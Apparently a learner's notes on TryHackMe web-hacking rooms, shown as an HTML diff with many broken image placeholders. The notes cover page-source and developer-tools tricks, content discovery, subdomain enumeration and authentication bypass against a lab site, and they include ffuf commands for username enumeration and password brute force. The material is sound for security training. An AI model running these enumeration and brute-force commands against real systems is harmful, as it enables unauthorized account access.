+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Feature</strong></td>
+      <td><strong>URL</strong></td>
+      <td><strong>Summary</strong></td>
+    </tr>
+    <tr>
+      <td>Home Page</td>
+      <td>/</td>
+      <td>This page contains a summary of what Acme IT Support does with a company photo of their staff.</td>
+    </tr>
+    <tr>
+      <td>Latest News</td>
+      <td>/news</td>
+      <td>This page contains a list of recently published news articles by the company, and each news article has a link with an id number, i.e. /news/article?id=1</td>
+    </tr>
+    <tr>
+      <td>News Article</td>
+      <td>/news/article?id=1</td>
+      <td>Displays the individual news article. Some articles seem to be blocked and reserved for premium customers only.</td>
+    </tr>
+    <tr>
+      <td>Contact Page</td>
+      <td>/contact</td>
+      <td>This page contains a form for customers to contact the company. It contains name, email and message input fields and a send button.</td>
+    </tr>
+    <tr>
+      <td>Customers</td>
+      <td>/customers</td>
+      <td>This link redirects to /customers/login.</td>
+    </tr>
+    <tr>
+      <td>Customer Login</td>
+      <td>/customers/login</td>
+      <td>This page contains a login form with username and password fields.</td>
+    </tr>
+    <tr>
+      <td>Customer Signup</td>
+      <td>/customers/signup</td>
+      <td>This page contains a user-signup form that consists of a username, email, password and password confirmation input fields.</td>
+    </tr>
+    <tr>
+      <td>Customer Reset Password</td>
+      <td>/customers/reset</td>
+      <td>Password reset form with an email address input field.</td>
+    </tr>
+    <tr>
+      <td>Customer Dashboard</td>
+      <td>/customers</td>
+      <td>This page contains a list of the user’s tickets submitted to the IT support company and a “Create Ticket” button.</td>
+    </tr>
+    <tr>
+      <td>Create Ticket</td>
+      <td>/customers/ticket/new</td>
+      <td>This page contains a form with a textbox for entering the IT issue and a file upload option to create an IT support ticket.</td>
+    </tr>
+    <tr>
+      <td>Customer Account</td>
+      <td>/customers/account</td>
+      <td>This page allows the user to edit their username, email and password.</td>
+    </tr>
+    <tr>
+      <td>Customer Logout</td>
+      <td>/customers/logout</td>
+      <td>This link logs the user out of the customer area.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>We will start taking a deeper look into some of the pages we have discovered in the next task.</p>
+
+<h4 id="viewing-the-page-source">Viewing The Page Source</h4>
+
+<ul>
+  <li>page source is the human-readable code returned to our browser/client from the web server each time we make a request.</li>
+  <li>returned code is made up of HTML ( HyperText Markup Language), CSS ( Cascading Style Sheets ) and JavaScript, and it’s what tells our browser what content to display, how to show it and adds an element of interactivity with JavaScript.</li>
+</ul>
+
+<p>![[Pasted image 20241104041913.png]]</p>
+
+<p>![[Pasted image 20241104041656.png]]</p>
+
+<p>![[Pasted image 20241104155020.png]]</p>
+
+<p>for directory listing flag -&gt; for that there is a /assets for there we are able to get the</p>
+
+<h4 id="developer-tools"><strong>Developer Tools</strong></h4>
+
+<p>Every modern browser includes developer tools; this is a tool kit used to aid web developers in debugging web applications and gives you a peek under the hood of a website to see what is going on. As a pentester, we can leverage these tools to provide us with a much better understanding of the web application. We’re specifically focusing on three features of the developer tool kit, Inspector, Debugger and Network.</p>
+
+<h5 id="opening-developer-tools"><strong>Opening Developer Tools</strong></h5>
+
+<p>The way to access developer tools is different for every browser. If you’re not sure how to access it, click the “View Site” button on the top right of this task to get instructions to how to access the tools for your browser.</p>
+
+<h5 id="inspector"><strong>Inspecto</strong><strong>r</strong></h5>
+
+<p>The page source doesn’t always represent what’s shown on a webpage; this is because CSS, JavaScript and user interaction can change the content and style of the page, which means we need a way to view what’s been displayed in the browser window at this exact time. Element inspector assists us with this by providing us with a live representation of what is currently on the website.</p>
+
+<p>As well as viewing this live view, we can also edit and interact with the page elements, which is helpful for web developers to debug issues.</p>
+
+<p>On the Acme IT Support website, click into the news section, where you’ll see three news articles.</p>
+
+<p>The first two articles are readable, but the third has been blocked with a floating notice above the content stating you have to be a premium customer to view the article. These floating boxes blocking the page contents are often referred to as paywalls as they put up a metaphorical wall in front of the content you wish to see until you pay.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/96b49cec6712a47c4ea986d26c6b7451.png" alt="" /></p>
+
+<p>Right-clicking on the premium notice ( paywall ), you should be able to select the Inspect option from the menu, which opens the developer tools either on the bottom or right-hand side depending on your browser or preferences. You’ll now see the elements/HTML that make up the website ( similar to the screenshots below ).</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0e3f5c5c8dd02916d6fc2637461293a9.png" alt="" /></p>
+
+<p><em>(Click on the image to enlarge)</em></p>
+
+<p>Locate the <code class="language-plaintext highlighter-rouge">DIV</code> element with the class <code class="language-plaintext highlighter-rouge">premium-customer-blocker</code> and click on it. You’ll see all the CSS styles in the styles box that apply to this element, such as <code class="language-plaintext highlighter-rouge">margin-top: 60px</code> and <code class="language-plaintext highlighter-rouge">text-align: center</code>. The style we’re interested in is the <code class="language-plaintext highlighter-rouge">display: block</code>. If you click on the word <code class="language-plaintext highlighter-rouge">block</code>, you can type a value of your own choice. Try typing <code class="language-plaintext highlighter-rouge">none</code>, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn’t have a display field, you could click below the last style and add in your own. Have a play with the element inspector, and you’ll see you can change any of the information on the website, including the content. Remember this is only edited on your browser window, and when you press refresh, everything will be back to normal.</p>
+
+<p>![[Pasted image 20241105002112.png]]</p>
+
+<h4 id="developer-tools---debugger">Developer Tools - Debugger</h4>
+
+<p>intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it’s called Sources.’</p>
+
+<p>so i noticed something related to the <code class="language-plaintext highlighter-rouge">contact</code> section , then we could view the source code , and in the <code class="language-plaintext highlighter-rouge">sources</code> section we could see that there is a <code class="language-plaintext highlighter-rouge">flash.min.js</code> and there is a function named <code class="language-plaintext highlighter-rouge">flash</code> and clicking that will inovke the</p>
+
+<p>![[Pasted image 20241106151409.png]]</p>
+
+<p>This panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it’s called Sources.</p>
+
+<p>On the Acme IT Support website, click on the contact page, each time the page is loaded, you might notice a rapid flash of red on the screen. We’re going to use the Debugger to work out what this red flash is and if it contains anything interesting. Debugging a red dot wouldn’t be something you’d do in the real world as a penetration tester, but it does allow us to use this feature and get used to the Debugger.</p>
+
+<p>In both browsers, on the left-hand side, you see a list of all the resources the current webpage is using. If you click into the assets folder, you’ll see a file named flash.min.js. Clicking on this file displays the contents of the JavaScript file.</p>
+
+<p>Many times when viewing javascript files, you’ll notice that everything is on one line, which is because it has been minimised, which means all formatting ( tabs, spacing and newlines ) have been removed to make the file smaller. This file is no exception to this, and it has also been obfusticated, which makes it purposely difficult to read, so it can’t be copied as easily by other developers.</p>
+
+<p>We can return some of the formattings by using the “Pretty Print” option, which looks like two braces { } to make it a little more readable, although due to the obfustication, it’s still difficult to comprehend what is going on with the file. If you scroll to the bottom of the flash.min.js file, you’ll see the line: <code class="language-plaintext highlighter-rouge">flash['remove']();</code> </p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/d76d0b263799865be55d6725cbeaf21b.png" alt="" /></p>
+
+<p><em>(Click on the image to enlarge)</em></p>
+
+<p>This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called <strong>breakpoints</strong>. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.</p>
+
+<p>If you click the line number that contains the above code, you’ll notice it turns blue; you’ve now inserted a breakpoint on this line. Now try refreshing the page, and you’ll notice the red box stays on the page instead of disappearing, and it contains a flag
+![[Pasted image 20241106151327.png]]</p>
+
+<h4 id="developer-tools---network">Developer Tools - Network</h4>
+
+<p>The network tab on the developer tools can be used to keep track of every external request a webpage makes. If you click on the Network tab and then refresh the page, you’ll see all the files the page is requesting. </p>
+
+<p>Try doing this on the contact page; you can press the trash can icon to delete the list if it gets a bit overpopulated.</p>
+
+<p>With the network tab open, try filling in the contact form and pressing the <strong>Send Message</strong> button. You’ll notice an event in the network tab, and this is the form being submitted in the background using a method called AJAX. AJAX is a method for sending and receiving network data in a web application background without interfering by changing the current web page.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9ec0890f159397547950ea1822994443.png" alt="" /></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241106152352.png</td>
+      <td>Examine the new entry on the network tab that the contact form created and view the page the data was sent to in order to reveal a flag.]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>![[Pasted image 20241106152110.png]]</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241106152520.png</td>
+      <td>the flag we found in the preview section when we passed our values through the form and then there a section got created named]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h3 id="content-discovery">Content Discovery</h3>
+
+<p>Learn the various ways of discovering hidden or private content on a webserver that could lead to new vulnerabilities.</p>
+
+<p> Content can be many things, a file, video, picture, backup, a website feature. When we talk about content discovery, we’re not talking about the obvious things we can see on a website; it’s the things that aren’t immediately presented to us and that weren’t always intended for public access.</p>
+<ul>
+  <li>pages , portals intended for staff usage , older version of the website</li>
+</ul>
+
+<p><em>There are three main ways of discovering content on a website which we’ll cover. Manually, Automated and OSINT (Open-Source Intelligence).</em></p>
+
+<ul>
+  <li>while pinging the target we could understand about the target which is active now -&gt; <code class="language-plaintext highlighter-rouge">ping 10.10.91.5</code></li>
+  <li>![[Pasted image 20241107115056.png]]</li>
+  <li>now lets move to the next topics -&gt;</li>
+</ul>
+
+<h4 id="manual-discovery---robotstxt">Manual Discovery - Robots.txt</h4>
+
+<ul>
+  <li>multiple places we can manually check on a website to start discovering more content.</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>![[Pasted image 20241107115432.png</td>
+          <td>so there is a some texts that are allowed on the website]]</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<blockquote>
+  <p>[!Robots.txt]
+The robots.txt file is a document that tells search engines which pages they are and aren’t allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren’t displayed in search engine results. These pages may be areas such as administration portals or files meant for the website’s customers. This file gives us a great list of locations on the website that the owners don’t want us to discover as penetration testers.</p>
+</blockquote>
+
+<h4 id="manual-discovery---favicon">Manual Discovery - Favicon</h4>
+
+<p><strong>Favicon</strong>
+The favicon is a small icon displayed in the browser’s address bar or tab used for branding a website.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241107120049.png</td>
+      <td>https://wiki.owasp.org/index.php/OWASP_favicon_database]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>![[Pasted image 20241107120420.png]]</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241107120215.png</td>
+      <td>this is making sure that the favicon is there]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><code class="language-plaintext highlighter-rouge">curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum</code>
+![[Pasted image 20241107122835.png]]</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241107122926.png</td>
+      <td>this is the type of the framework that the database is using]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="manual-discovery---sitemapxml">Manual Discovery - Sitemap.xml</h4>
+
+<p>![[Pasted image 20241108121755.png]]</p>
+
+<h4 id="manual-discovery---http-headers">Manual Discovery - HTTP Headers</h4>
+<p><strong>HTTP Headers</strong></p>
+
+<p>When we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use.
+Try running the below curl command against the web server, where the <strong>-v</strong>switch enables verbose mode, which will output the headers (there might be something interesting!).</p>
+
+<p>![[Pasted image 20241108122433.png]]</p>
+
+<h4 id="manual-discovery---framework-stack">Manual Discovery - Framework Stack</h4>
+<p><strong>Framework Stack</strong></p>
+
+<p>Once you’ve established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework’s website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.</p>
+
+<p>Looking at the page source of our Acme IT Support website (<a href="http://10.10.83.120/">http://10.10.83.120</a>), you’ll see a comment at the end of every page with a page load time and also a link to the framework’s website, which is <a href="https://static-labs.tryhackme.cloud/sites/thm-web-framework">https://static-labs.tryhackme.cloud/sites/thm-web-framework</a>. Let’s take a look at that website. Viewing the documentation page gives us the path of the framework’s administration portal, which gives us a flag if viewed on the Acme IT Support website</p>
+
+<p>![[Pasted image 20241108124548.png]]</p>
+
+<p>![[Pasted image 20241108124608.png]]</p>
+
+<h4 id="osint---google-hacking--dorking">OSINT - Google Hacking / Dorking</h4>
+
+<p>There are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they’re freely available tools that collect information:</p>
+
+<p><strong>Google Hacking / Dorking</strong></p>
+
+<p>Google hacking / Dorking utilizes Google’s advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the <strong>site:</strong> filter, for example (site:<a href="http://tryhackme.com/">tryhackme.com</a>) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the <a href="http://tryhackme.com/">tryhackme.com</a> website which contain the word admin in its content. You can combine multiple filters as well. Here is an example of more filters you can use:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Filter</strong></td>
+      <td><strong>Example</strong></td>
+      <td><strong>Description</strong></td>
+    </tr>
+    <tr>
+      <td>site</td>
+      <td>site:tryhackme.com</td>
+      <td>returns results only from the specified website address</td>
+    </tr>
+    <tr>
+      <td>inurl</td>
+      <td>inurl:admin</td>
+      <td>returns results that have the specified word in the URL</td>
+    </tr>
+    <tr>
+      <td>filetype</td>
+      <td>filetype:pdf</td>
+      <td>returns results which are a particular file extension</td>
+    </tr>
+    <tr>
+      <td>intitle</td>
+      <td>intitle:admin</td>
+      <td>returns results that contain the specified word in the title</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>More information about google hacking can be found here: <a href="https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</a></p>
+
+<h4 id="osint---wappalyzer">OSINT - Wappalyzer</h4>
+
+<p><strong>Wappalyzer</strong></p>
+
+<p>Wappalyzer (<a href="https://www.wappalyzer.com/">https://www.wappalyzer.com/</a>) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.</p>
+
+<h4 id="osint---wayback-machine">OSINT - Wayback Machine</h4>
+
+<p><strong>Wayback Machine</strong></p>
+
+<p>The Wayback Machine (<a href="https://archive.org/web/">https://archive.org/web/</a>) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.</p>
+
+<h4 id="osint---github">OSINT - GitHub</h4>
+
+<p><strong>GitHub</strong></p>
+
+<p>To understand GitHub, you first need to understand Git. Git is a <strong>version control system</strong> that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub’s search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn’t yet found.</p>
+
+<h4 id="osint---s3-buckets">OSINT - S3 Buckets</h4>
+<p><strong>S3 Buckets</strong></p>
+
+<p>S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn’t be available to the public. The format of the S3 buckets is http(s)://<strong>{name}.</strong><a href="http://s3.amazonaws.com/"><strong>s3.amazonaws.com</strong></a> where {name} is decided by the owner, such as <a href="http://tryhackme-assets.s3.amazonaws.com/">tryhackme-assets.s3.amazonaws.com</a>. S3 buckets can be discovered in many ways, such as finding the URLs in the website’s page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as <strong>{name}</strong>-assets, <strong>{name}</strong>-www, <strong>{name}</strong>-public, <strong>{name}</strong>-private, etc.</p>
+
+<h4 id="automated-discovery">Automated Discovery</h4>
+<p><strong>What is Automated Discovery?</strong></p>
+
+<p>Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn’t previously know existed. This process is made possible by using a resource called wordlists.</p>
+
+<p><strong>What are wordlists?</strong></p>
+
+<p>Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we’re looking for content in our case, so we’d require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is <a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a> which Daniel Miessler curates.</p>
+
+<p><strong>Automation Tools</strong></p>
+
+<p>Although there are many different content discovery tools available, all with their features and flaws, we’re going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.</p>
+
+<p>On the AttackBox execute the following three commands, targeting the Acme IT Support website and see what results you get.</p>
+
+<p><strong>Using ffuf:</strong></p>
+
+<p>ffuf</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@machine$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt <span class="nt">-u</span> http://10.10.83.120/FUZZ
+</code></pre></div></div>
+
+<p><strong>Using dirb:</strong></p>
+
+<p>dirb</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@machine$</span><span class="w"> </span>dirb http://10.10.83.120/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</code></pre></div></div>
+
+<p><strong>Using Gobuster:</strong></p>
+
+<p>gobuster</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@machine$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">--url</span> http://10.10.83.120/ <span class="nt">-w</span> /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+</code></pre></div></div>
+
+<div class="code-wrapper">
+  <button class="copy-button" onclick="copyToClipboard(this)">📋 Copy</button>
+  <pre><code>gobuster dir --url http://10.10.83.120/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</code></pre>
+</div>
+
+<p>there is some clipboard added</p>
+
+<p>![[Pasted image 20241108125712.png]]</p>
+
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
+
+<p>Learn the various ways of discovering subdomains to expand your attack surface of a target.</p>
+
+<h4 id="brief">Brief</h4>
+<p>Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability.</p>
+
+<p>We will explore three different subdomain enumeration methods: Brute Force, OSINT(Open-Source Intelligence) and Virtual Host.</p>
+
+<h4 id="osint---ssltls-certificates">OSINT - SSL/TLS Certificates</h4>
+<p><strong>SSL/TLS Certificates</strong></p>
+
+<p>When an SSL/TLS (Secure Sockets Layer/Transport Layer Security) certificate is created for a domain by a CA (Certificate Authority), CA’s take part in what’s called “Certificate Transparency (CT) logs”. These are publicly accessible logs of every SSL/TLS certificate created for a domain name. The purpose of Certificate Transparency logs is to stop malicious and accidentally made certificates from being used. We can use this service to our advantage to discover subdomains belonging to a domain, sites like <a href="http://crt.sh/">https://crt.sh</a> and <a href="https://ui.ctsearch.entrust.com/ui/ctsearchui">https://ui.ctsearch.entrust.com/ui/ctsearchui</a> offer a searchable database of certificates that shows current and historical results.</p>
+
+<p>Go to <a href="https://crt.sh/">crt.sh</a> and search for the domain name <strong>tryhackme.com</strong>, find the entry that was logged at <strong>2020-12-26</strong> and enter the domain below to answer the question.</p>
+
+<p>![[Pasted image 20241108131509.png]]</p>
+
+<h4 id="osint---search-engines">OSINT - Search Engines</h4>
+<p><strong>Search Engines</strong></p>
+
+<p>Search engines contain trillions of links to more than a billion websites, which can be an excellent resource for finding new subdomains. Using advanced search methods on websites like Google, such as the site: filter, can narrow the search results. For example, <code class="language-plaintext highlighter-rouge">site:*.domain.com -site:www.domain.com</code> would only contain results leading to the domain name domain.com but exclude any links to www.domain.com; therefore, it shows us only subdomain names belonging to domain.com.</p>
+
+<p>Go to <a href="https://www.google.com/">Google</a> and use the search term <code class="language-plaintext highlighter-rouge">site:*.tryhackme.com -site:www.tryhackme.com</code>, which should reveal a subdomain for tryhackme.com; use that subdomain to answer the question below.</p>
+
+<p>![[Pasted image 20241108132654.png]]</p>
+
+<h4 id="dns-bruteforce">DNS Bruteforce</h4>
+
+<p>Bruteforce DNS (Domain Name System) enumeration is the method of trying tens, hundreds, thousands or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. Because this method requires many requests, we automate it with tools to make the process quicker. In this instance, we are using a tool called dnsrecon to perform this. Click the “View Site” button to open the static site, press the “Run DNSrecon Request” button to start the simulation, and then answer the question below.</p>
+
+<p>![[Pasted image 20241108133022.png]]</p>
+
+<h4 id="osint---sublist3r">OSINT - Sublist3r</h4>
+
+<p><strong>Automation Using Sublist3r</strong></p>
+
+<p>To speed up the process of OSINT subdomain discovery, we can automate the above methods with the help of tools like <a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>, click the “View Site” button to open up the static site and run the sublist3r simulation to discover a new subdomain that will help answer the question below.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@thm:~<span class="nv">$ </span>./sublist3r.py <span class="nt">-d</span> acmeitsupport.thm
+</code></pre></div></div>
+<p>![[Pasted image 20241108133151.png]]</p>
+
+<h4 id="virtual-hosts">Virtual Hosts</h4>
+
+<p>Some subdomains aren’t always hosted in publically accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer’s machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\hosts file for Windows users) which maps domain names to IP addresses. </p>
+
+<p>Because web servers can host multiple websites from one server when a website is requested from a client, the server knows which website the client wants from the <strong>Host</strong> header. We can utilise this host header by making changes to it and monitoring the response to see if we’ve discovered a new website.</p>
+
+<p>Like with DNS Bruteforce, we can automate this process by using a wordlist of commonly used subdomains.</p>
+
+<p>Start an AttackBox and then try the following command against the Acme IT Support machine to try and discover a new subdomain.</p>
+
+<p>ffuf</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@machine$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.acmeitsupport.thm"</span> <span class="nt">-u</span> http://10.10.38.100
+</code></pre></div></div>
+
+<p>The above command uses the <strong>-w</strong> switch to specify the wordlist we are going to use. The <strong>-H</strong> switch adds/edits a header (in this instance, the Host header), we have the <strong>FUZZ</strong> keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist. </p>
+
+<p>Because the above command will always produce a valid result, we need to filter the output. We can do this by using the page size result with the <strong>-fs</strong> switch. Edit the below command replacing {size} with the most occurring size value from the previous result and try it on the AttackBox.</p>
+
+<p>ffuf</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@machine$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.acmeitsupport.thm"</span> <span class="nt">-u</span> http://10.10.38.100 <span class="nt">-fs</span> <span class="o">{</span>size<span class="o">}</span>
+</code></pre></div></div>
+
+<p>This command has a similar syntax to the first apart from the <strong>-fs</strong> switch, which tells ffuf to ignore any results that are of the specified size.</p>
+
+<h3 id="authentication-bypass">Authentication Bypass</h3>
+
+<p>Learn how to defeat logins and other authentication mechanisms to allow you access to unpermitted areas.</p>
+
+<h4 id="brief-1">brief</h4>
+<p>In this room, we will learn about different ways website authentication methods can be bypassed, defeated or broken. These vulnerabilities can be some of the most critical as it often ends in leaks of customers personal data.</p>
+
+<h4 id="username-enumeration">username enumeration</h4>
+<p>Website error messages are great resources for collating this information to build our list of valid usernames. We have a form to create a new user account if we go to the Acme IT Support website (<a href="http://10.10.41.197/customers/signup">http://10.10.41.197/customers/signup</a>) signup page.</p>
+
+<p>when we are trying to login through  username: <code class="language-plaintext highlighter-rouge">admin</code> , and password : <code class="language-plaintext highlighter-rouge">admin</code> we see that the authentication failed 
+<strong>An account with this username already exists</strong>. We can use the existence of this error message to produce a list of valid usernames already signed up on the system by using the ffuf tool below. The ffuf tool uses a list of commonly used usernames to check against for any matches.</p>
+
+<p>Username enumeration with ffuf</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@tryhackme$</span><span class="w"> </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/SecLists/Usernames/Names/names.txt <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"username=FUZZ&amp;email=x&amp;password=x&amp;cpassword=x"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-u</span> http://10.10.41.197/customers/signup <span class="nt">-mr</span> <span class="s2">"username already exists"</span>
+</code></pre></div></div>
+
+<p>In the above example, the <code class="language-plaintext highlighter-rouge">-w</code> argument selects the file’s location on the computer that contains the list of usernames that we’re going to check exists. The <code class="language-plaintext highlighter-rouge">-X</code>argument specifies the request method, this will be a GET request by default, but it is a POST request in our example. The <code class="language-plaintext highlighter-rouge">-d</code> argument specifies the data that we are going to send. In our example, we have the fields username, email, password and cpassword. We’ve set the value of the username to <strong>FUZZ</strong>. In the ffuf tool, the FUZZ keyword signifies where the contents from our wordlist will be inserted in the request. The <code class="language-plaintext highlighter-rouge">-H</code> argument is used for adding additional headers to the request. In this instance, we’re setting the <code class="language-plaintext highlighter-rouge">Content-Type</code> so the web server knows we are sending form data. The <code class="language-plaintext highlighter-rouge">-u</code> argument specifies the URL we are making the request to, and finally, the <code class="language-plaintext highlighter-rouge">-mr</code> argument is the text on the page we are looking for to validate we’ve found a valid username.</p>
+
+<p>The ffuf tool and wordlist come pre-installed on the <strong>AttackBox</strong> or can be installed locally by downloading it from <a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a>.
+![[Pasted image 20241109011832.png]]</p>
+
+<h4 id="brute-force">brute force</h4>
+
+<p>Using the valid_usernames.txt file we generated in the previous task, we can now use this to attempt a brute force attack on the login page (<a href="http://10.10.88.140/customers/login">http://10.10.88.140/customers/login</a>).</p>
+
+<p><strong>Note: If you created your valid_usernames file by piping the output from ffuf directly you may have difficulty with this task. Clean your data, or copy just the names into a new file.</strong></p>
+
+<p>A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.</p>
+
+<p>When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.</p>
+
+<p>Bruteforcing with ffuf</p>
+
+<div class="language-shell-session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@tryhackme$</span><span class="w"> </span>ffuf <span class="nt">-w</span> valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"username=W1&amp;password=W2"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-u</span> http://10.10.88.140/customers/login <span class="nt">-fc</span> 200
+</code></pre></div></div>
+
+<p>This ffuf command is a little different to the previous one in Task 2. Previously we used the <strong>FUZZ</strong> keyword to select where in the request the data from the wordlists would be inserted, but because we’re using multiple wordlists, we have to specify our own FUZZ keyword. In this instance, we’ve chosen <code class="language-plaintext highlighter-rouge">W1</code> for our list of valid usernames and <code class="language-plaintext highlighter-rouge">W2</code> for the list of passwords we will try. The multiple wordlists are again specified with the <code class="language-plaintext highlighter-rouge">-w</code> argument but separated with a comma.  For a positive match, we’re using the <code class="language-plaintext highlighter-rouge">-fc</code> argument to check for an HTTP status code other than 200.</p>
+
+<p>need to create a new file named <code class="language-plaintext highlighter-rouge">valid_usernames.txt</code></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241109115635.png</td>
+      <td>a file that will be containing all the valid usernames]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>![[Pasted image 20241109114931.png]]</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>![[Pasted image 20241109115047.png</td>
+      <td>by putting steve and thunder as password we reached to the customer dashboard]]</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="logic-flaw">Logic Flaw</h4>
+
+<p>Sometimes <strong>authentication</strong> processes <strong>contain logic flaws</strong>. A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker. Logic flaws can exist in any area of a website, but we’re going to concentrate on examples relating to authentication in this instance.</p>
+
+<p>![[Pasted image 20241110172150.png]]</p>
+
